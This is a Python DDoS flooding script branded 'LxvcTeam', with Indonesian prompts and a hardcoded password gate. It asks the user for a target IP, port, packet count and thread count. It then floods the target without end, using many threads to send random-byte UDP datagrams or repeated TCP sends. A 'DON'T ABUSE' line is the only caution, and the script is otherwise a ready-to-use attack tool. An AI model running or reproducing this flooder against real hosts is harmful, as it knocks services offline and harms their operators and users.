#!/usr/bin/env python3
#LxvcTeamV1.2
import time
import random
import socket
import threading
import os

os.system("clear")
password ="Lxvc"

for i in range(3):
	pwd = input("[•] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] TUNGGU 5 DETIK!!! ")
		break
	else:
		time.sleep(5)
		print("[×] PASSWORD SALAH!!! ")
		continue
time.sleep(5)
print("[√] Berhasil Login, Wait")
time.sleep(5)
print("------------------------------------------------------------")
print(" >>   Discord : Unknow#1716      <<")
print(" >>   Tools Created By Lxvc Team <<")
print(" >>   NOTE : DON'T ABUSE!!       <<")
print("------------------------------------------------------------")
ip = str(input(" LxvcTeam | Ip:"))
port = int(input(" LxvcTeam | Port:"))
choice = str(input(" LxvcTeam | Ddos Gak?(y/n):"))
times = int(input(" LxvcTeam | Packets:"))
threads = int(input(" LxvcTeam | Threads:"))
def run():
	data = random._urandom(1600)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" LXVC TEAM PRESENT ")
		except:
			print("[!] LXVC FUCKING THE SERVER !!! ")

def run2():
	data = random._urandom(17)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" LXVC TEAM PRESENT ")
		except:
			s.close()
			print("[*] LXVC FUCKING THE SERVERS! ")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
